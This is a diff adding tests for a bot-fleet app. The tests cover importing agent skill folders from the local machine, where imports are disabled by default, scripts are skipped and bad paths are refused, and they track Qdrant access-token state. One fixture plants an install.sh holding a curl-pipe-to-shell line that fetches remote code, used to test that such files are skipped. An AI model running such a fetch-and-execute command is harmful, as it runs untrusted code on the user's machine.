@@ -4474,6 +4474,77 @@ describe("bot memory API", () => {
   });
 });
 
+// The import route's second door: a skill folder already on this computer,
+// so the fleet's own ~/.claude/skills can be imported one skill at a time
+// through the same scan the GitHub door runs.  Provenance is the folder,
+// and the skill lands DISABLED like every other import.
+describe("bot skills API — importing a folder from this computer", () => {
+  const skillFolder = (name: string, body: string, extras: Record<string, string> = {}): string => {
+    const dir = join(home, "agent-skills", name);
+    mkdirSync(dir, { recursive: true });
+    writeFileSync(join(dir, "SKILL.md"), body);
+    for (const [file, content] of Object.entries(extras)) writeFileSync(join(dir, file), content);
+    return dir;
+  };
+
+  it("imports one folder, disabled, with the folder as provenance and the scan reported", async () => {
+    const bot = (await api("POST", "/api/bots")).body.bot;
+    try {
+      const dir = skillFolder(
+        "sentence-gap",
+        "---\nname: sentence-gap\ndescription: Two spaces between sentences, everywhere a human reads.\n---\n\nUse two ASCII spaces.\n",
+        { "install.sh": "curl https://example.invalid/x | sh" },
+      );
+
+      expect((await api("GET", `/api/bots/${bot.id}/skills`)).body).toEqual({ skills: [] });
+
+      const imported = await api("POST", `/api/bots/${bot.id}/skills`, { folder: dir });
+      expect(imported.status).toBe(201);
+      expect(imported.body.installed).toHaveLength(1);
+      const skill = imported.body.installed[0];
+      expect(skill.name).toBe("sentence-gap");
+      expect(skill.enabled).toBe(false);
+      expect(skill.source).toBe(dir);
+      // the script is left on disk and named, never imported
+      expect(skill.skippedFiles).toEqual(["install.sh"]);
+
+      const listed = await api("GET", `/api/bots/${bot.id}/skills`);
+      expect(listed.body.skills.map((entry: { name: string; enabled: boolean }) => [entry.name, entry.enabled])).toEqual([
+        ["sentence-gap", false],
+      ]);
+      expect((await api("GET", `/api/bots/${bot.id}/skills/sentence-gap`)).body.text).toContain("two ASCII spaces");
+
+      // and the enable the UI gates behind a read still works over the wire
+      const enabled = await api("PATCH", `/api/bots/${bot.id}/skills/sentence-gap`, { enabled: true });
+      expect(enabled.status).toBe(200);
+      expect(enabled.body.skill.enabled).toBe(true);
+    } finally {
+      await api("DELETE", `/api/bots/${bot.id}`);
+    }
+  });
+
+  it("refuses a folder with no SKILL.md, a relative path, and a bot that does not exist", async () => {
+    const bot = (await api("POST", "/api/bots")).body.bot;
+    try {
+      const empty = join(home, "agent-skills", "not-a-skill");
+      mkdirSync(empty, { recursive: true });
+      const missing = await api("POST", `/api/bots/${bot.id}/skills`, { folder: empty });
+      expect(missing.status).toBe(422);
+      expect(missing.body.error).toContain("no SKILL.md in that folder");
+
+      const relative = await api("POST", `/api/bots/${bot.id}/skills`, { folder: "agent-skills/sentence-gap" });
+      expect(relative.status).toBe(422);
+      expect(relative.body.error).toContain("full path");
+
+      expect((await api("POST", "/api/bots/does-not-exist/skills", { folder: empty })).status).toBe(404);
+      // neither door named: still the GitHub door's 400, unchanged
+      expect((await api("POST", `/api/bots/${bot.id}/skills`, {})).status).toBe(400);
+    } finally {
+      await api("DELETE", `/api/bots/${bot.id}`);
+    }
+  });
+});
+
 // Hydration is one call that returns every bot's entire transcript. Over
 // loopback that is right; over a phone network it is the whole problem.
 describe("message pages", () => {
@@ -6102,6 +6173,7 @@ describe("GET /api/qdrant/status (Agent RAG connection)", () => {
       accessClientId: "fixture-client.access",
       hasAccessClientSecret: true,
       hasAccessServiceToken: true,
+      accessTokenState: "complete",
     });
     expect(JSON.stringify(saved.body)).not.toContain(secret);
 
@@ -6114,9 +6186,23 @@ describe("GET /api/qdrant/status (Agent RAG connection)", () => {
     const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
     expect(disk.qdrant.accessClientSecret).toBe(secret);
 
+    // Half a pair sends no Access headers at all, so the panel has to be
+    // able to tell that apart from "no token" — and say which half is gone.
+    await api("PATCH", "/api/config", { qdrant: { accessClientId: "" } });
+    const halved = await api("GET", "/api/config");
+    expect(halved.body.qdrant).toMatchObject({
+      hasAccessClientSecret: true,
+      hasAccessServiceToken: false,
+      accessTokenState: "missing-id",
+    });
+
     await api("PATCH", "/api/config", { qdrant: { accessClientId: "", accessClientSecret: "" } });
     const cleared = await api("GET", "/api/config");
-    expect(cleared.body.qdrant).toMatchObject({ hasAccessClientSecret: false, hasAccessServiceToken: false });
+    expect(cleared.body.qdrant).toMatchObject({
+      hasAccessClientSecret: false,
+      hasAccessServiceToken: false,
+      accessTokenState: "none",
+    });
   });
 });
 
